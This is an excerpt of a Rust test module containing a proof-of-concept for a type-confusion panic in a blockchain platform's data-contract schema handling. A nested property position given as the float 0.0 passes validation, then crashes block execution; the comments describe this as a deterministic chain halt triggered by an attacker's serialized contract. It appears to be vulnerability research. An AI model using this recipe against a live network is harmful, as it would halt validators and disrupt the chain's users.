...
mod tests {
    ...
    // ====================================================================
    // PoC: nested document-property `position` TYPE CONFUSION -> panic.
    //
    // `insert_values_nested` (try_from_schema/mod.rs:209-217) reads each NESTED
    // object sub-property's `position` via `get_integer::<u64>(POSITION)
    // .expect("expected a position")` and runs UNCONDITIONALLY (NOT gated by
    // full_validation; called at v1/mod.rs:299). The meta-schema only constrains
    // position as {type:integer, minimum:0}. `to_integer::<u64>` rejects a
    // Value::Float (returns Err) and an integer > u64::MAX (IntegerSizeError).
    // JSON-Schema "integer" accepts a zero-fraction float and has no upper bound.
    // => a nested position that PASSES the meta-schema (full_validation=true) may
    //    still PANIC in insert_values_nested  ==> block-execution chain halt.
    // ====================================================================
    mod position_type_confusion_poc {
        ...
        // { properties: { outer(object, position 0): { properties: {
        //     inner_a(string, <inner_position>),  inner_b(string, position 1)
        // } } } }
        // TWO nested sub-properties are required: sort_by() only invokes its
        // comparator (which calls get_integer(POSITION).expect()) when there are
        // >= 2 elements. With a single nested property the comparator is never
        // called and the .expect() is unreachable.
        fn schema_with_nested_inner_position(inner_position: Option<Value>) -> Value {
            let mut inner_a_pairs = vec![("type", Value::Text("string".to_string()))];
            if let Some(p) = inner_position {
                inner_a_pairs.push(("position", p));
            }
            inner_a_pairs.push(("maxLength", Value::U64(10)));
            let inner_a = obj(inner_a_pairs);
            let inner_b = obj(vec![
                ("type", Value::Text("string".to_string())),
            ...
            let outer = obj(vec![
                ...
                (
                    "properties",
                    obj(vec![("inner_a", inner_a), ("inner_b", inner_b)]),
                ),
        ...
        fn run(label: &str, inner_position: Option<Value>, full_validation: bool) {
            let platform_version = PlatformVersion::latest();
            let config = DataContractConfig::default_for_version(platform_version)
                .expect("config");
            let cfg_version = config.version();
            let schema = schema_with_nested_inner_position(inner_position);
            ...
            match outcome {
                Err(_) => eprintln!(
                    ">>> [{label}] full_validation={full_validation} => *** PANIC (node crash) ***"
                ),
                Ok(Ok(_)) => eprintln!(
                    ">>> [{label}] full_validation={full_validation} => Ok (schema ACCEPTED)"
                ),
                Ok(Err(_e)) => eprintln!(
                    ">>> [{label}] full_validation={full_validation} => clean Err (rejected)"
                ),
            }
        }
        ...
        fn position_type_confusion_experiment() {
            eprintln!("\n===== nested position type-confusion experiment (2 nested props) =====");
            // (true = consensus/block-execution path; false = check_tx path)
            ...
            run("float_0.0", Some(Value::Float(0.0)), true);
            ...
            eprintln!("===== end experiment =====\n");
        }

        /// END-TO-END (block-execution-path) PoC.
        ///
        /// Reproduces the EXACT operation every validator performs while executing
        /// a block that contains a `DataContractCreate`:
        ///   process_state_transition (ValidationMode::Validator)
        ///     -> data_contract_create::transform_into_action_v0
        ///        (full_validation = should_fully_validate..(Validator) = TRUE)
        ///     -> DataContractCreateTransitionAction::try_from_borrowed_transition(.., true, ..)
        ///     -> DataContract::try_from_platform_versioned(serialized_contract, /*full_validation*/ true, ..)
        ///     -> DocumentType::try_from_schema(.., true, ..)
        ///     -> insert_values_nested -> get_integer::<u64>(POSITION).expect() -> PANIC.
        ///
        /// The float `position: 0.0` can ONLY exist in the SERIALIZED contract form
        /// (a runtime DataContract cannot be built with it — both validation modes
        /// panic), which is exactly what an attacker puts on the wire. A panic here
        /// is uncaught (it is a panic, not a `ProtocolError::ConsensusError`, so the
        /// graceful `match` in transform_into_action_v0 never sees it) and crashes
        /// block execution on every validator => deterministic chain halt.
        #[test]
        fn block_execution_conversion_panics_on_float_position() {
            ...
            let platform_version = PlatformVersion::latest();
            let config =
                DataContractConfig::default_for_version(platform_version).expect("config");

            // Attacker's serialized contract: one document type "note" whose nested
            // object property carries position 0.0 (a zero-fraction FLOAT). The JSON
            // meta-schema {type:integer, minimum:0} accepts it; get_integer::<u64>
            // rejects Value::Float.
            let mut document_schemas = BTreeMap::new();
            document_schemas.insert(
                "note".to_string(),
                schema_with_nested_inner_position(Some(Value::Float(0.0))),
            );
            ...
            let outcome = catch_unwind(AssertUnwindSafe(|| {
                DataContract::try_from_platform_versioned(
                    format,
                    true, // full_validation = exactly what ValidationMode::Validator passes
                    &mut vec![],
                    platform_version,
                )
            }));
            ...
            match &outcome {
                Err(_) => eprintln!(
                    ">>> BLOCK-EXECUTION conversion of attacker contract => *** PANIC (chain halt) ***"
                ),
                Ok(Ok(_)) => eprintln!(">>> conversion Ok (NO panic) -- finding REFUTED"),
                Ok(Err(_)) => {
                    eprintln!(">>> conversion clean Err (rejected, NO panic) -- not a block halt")
                }
            }

            assert!(
                outcome.is_err(),
                "DataContract::try_from_platform_versioned(full_validation=true) must PANIC on a \
                 nested float position -- the deterministic block-execution chain halt"
            );
        }
    }
}
